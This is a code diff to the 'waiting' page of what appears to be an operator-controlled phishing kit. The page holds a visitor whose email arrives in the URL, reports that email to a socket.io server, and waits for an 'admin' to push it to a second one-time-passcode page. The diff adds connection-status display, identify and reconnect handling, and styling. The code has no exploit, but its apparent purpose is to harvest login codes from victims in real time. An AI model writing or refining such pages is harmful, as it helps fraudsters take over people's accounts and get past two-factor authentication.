@@ -37,23 +37,27 @@
         }
         h2 {
             margin-bottom: 10px;
+            font-size: 24px;
         }
         p {
             color: #aaa;
             margin-bottom: 20px;
+            font-size: 15px;
         }
         .email {
             color: #fe2c55;
             font-weight: 500;
             margin: 10px 0;
-            padding: 10px;
+            padding: 12px;
             background: #1a1a1a;
             border-radius: 40px;
             word-break: break-all;
+            border: 1px solid #2a2a2a;
+            font-size: 14px;
         }
         .waiting-message {
             background: #1a1a1a;
-            padding: 15px;
+            padding: 18px;
             border-radius: 40px;
             margin-top: 20px;
             border: 1px solid #2a2a2a;
@@ -84,10 +88,22 @@
             display: none;
             animation: slideIn 0.3s ease;
             z-index: 1000;
+            font-size: 14px;
         }
         @keyframes slideIn {
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
+        }
+        .connection-status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+        }
+        .connection-status.connected {
+            color: #4CAF50;
+        }
+        .connection-status.disconnected {
+            color: #f44336;
         }
     </style>
 </head>
@@ -102,75 +118,111 @@
             <span class="spinner"></span>
             <span>Waiting for admin to request second OTP...</span>
         </div>
+        <div id="connectionStatus" class="connection-status">Connecting to server...</div>
     </div>
 
     <div id="toast" class="toast"></div>
 
     <script src="/socket.io/socket.io.js"></script>
-<script>
-    // Get email from URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const email = urlParams.get('email');
-    
-    console.log('✅ Success page loaded for email:', email);
-    console.log('✅ Full URL:', window.location.href);
-    
-    if (email) {
-        document.getElementById('emailDisplay').textContent = email;
-    } else {
-        document.getElementById('emailDisplay').textContent = 'No email provided';
-    }
-
-    // Connect to socket.io
-    console.log('🔄 Connecting to socket.io...');
-    const socket = io();
-
-    socket.on('connect', () => {
-        console.log('✅ Socket connected successfully! ID:', socket.id);
-        showToast('Connected to server');
-    });
-
-    socket.on('connect_error', (error) => {
-        console.error('❌ Socket connection error:', error);
-    });
-
-    // Show toast notification
-    function showToast(message) {
-        const toast = document.getElementById('toast');
-        toast.textContent = message;
-        toast.style.display = 'block';
+    <script>
+        // Get email from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
         
-        setTimeout(() => {
-            toast.style.display = 'none';
-        }, 3000);
-    }
-
-    // Listen for redirect event from admin
-    socket.on('redirect-to-second-otp', (data) => {
-        console.log('📢 RECEIVED REDIRECT EVENT:', data);
-        console.log('📢 Current email:', email);
-        console.log('📢 Event email:', data.email);
+        console.log('✅ Success page loaded for email:', email);
+        console.log('✅ Full URL:', window.location.href);
         
-        if (data.email === email) {
-            console.log('✅ Email matches! Redirecting to:', data.redirectUrl);
-            showToast('📱 Admin requested second OTP! Redirecting...');
-            
-            // Redirect to otp.html with type=second parameter
-            setTimeout(() => {
-                window.location.href = data.redirectUrl;
-            }, 1500);
+        if (email) {
+            document.getElementById('emailDisplay').textContent = email;
         } else {
-            console.log('❌ Email mismatch - ignoring redirect');
+            document.getElementById('emailDisplay').textContent = 'No email provided';
         }
-    });
 
-    // Listen for test notifications
-    socket.on('test-notification', (data) => {
-        console.log('Test notification received:', data);
-    });
+        const statusEl = document.getElementById('connectionStatus');
 
-    // Optional: Add a manual refresh button or keep-alive
-    console.log('✅ Success page ready, waiting for admin to request second OTP...');
-</script>
+        // Connect to socket.io
+        console.log('🔄 Connecting to socket.io...');
+        const socket = io();
+
+        // Connection established
+        socket.on('connect', () => {
+            console.log('✅ Socket connected successfully! ID:', socket.id);
+            statusEl.textContent = '✅ Connected to server';
+            statusEl.className = 'connection-status connected';
+            showToast('Connected to server');
+            
+            // Identify this user to the server
+            socket.emit('identify', { email: email });
+            console.log('📤 Sent identify event for email:', email);
+        });
+
+        // Connection error
+        socket.on('connect_error', (error) => {
+            console.error('❌ Socket connection error:', error);
+            statusEl.textContent = '❌ Connection error - retrying...';
+            statusEl.className = 'connection-status disconnected';
+        });
+
+        // Reconnection attempts
+        socket.on('reconnecting', (attempt) => {
+            console.log('🔄 Reconnecting attempt:', attempt);
+            statusEl.textContent = `🔄 Reconnecting (attempt ${attempt})...`;
+        });
+
+        socket.on('reconnect', () => {
+            console.log('✅ Reconnected successfully');
+            statusEl.textContent = '✅ Reconnected to server';
+            statusEl.className = 'connection-status connected';
+            // Re-identify after reconnection
+            socket.emit('identify', { email: email });
+        });
+
+        // Show toast notification
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+
+        // Listen for redirect event from admin
+        socket.on('redirect-to-second-otp', (data) => {
+            console.log('📢 RECEIVED REDIRECT EVENT:', data);
+            console.log('📢 Current email:', email);
+            console.log('📢 Event email:', data.email);
+            
+            if (data.email === email) {
+                console.log('✅ Email matches! Redirecting to:', data.redirectUrl);
+                showToast('📱 Admin requested second OTP! Redirecting...');
+                
+                // Update status
+                statusEl.textContent = '🔄 Redirecting to second OTP page...';
+                
+                // Redirect to otp.html with type=second parameter
+                setTimeout(() => {
+                    window.location.href = data.redirectUrl;
+                }, 1500);
+            } else {
+                console.log('❌ Email mismatch - ignoring redirect');
+            }
+        });
+
+        // Listen for test notifications
+        socket.on('test-notification', (data) => {
+            console.log('Test notification received:', data);
+        });
+
+        // Handle disconnection
+        socket.on('disconnect', (reason) => {
+            console.log('🔌 Socket disconnected:', reason);
+            statusEl.textContent = '🔌 Disconnected from server';
+            statusEl.className = 'connection-status disconnected';
+        });
+
+        console.log('✅ Success page ready, waiting for admin to request second OTP...');
+    </script>
 </body>
 </html>
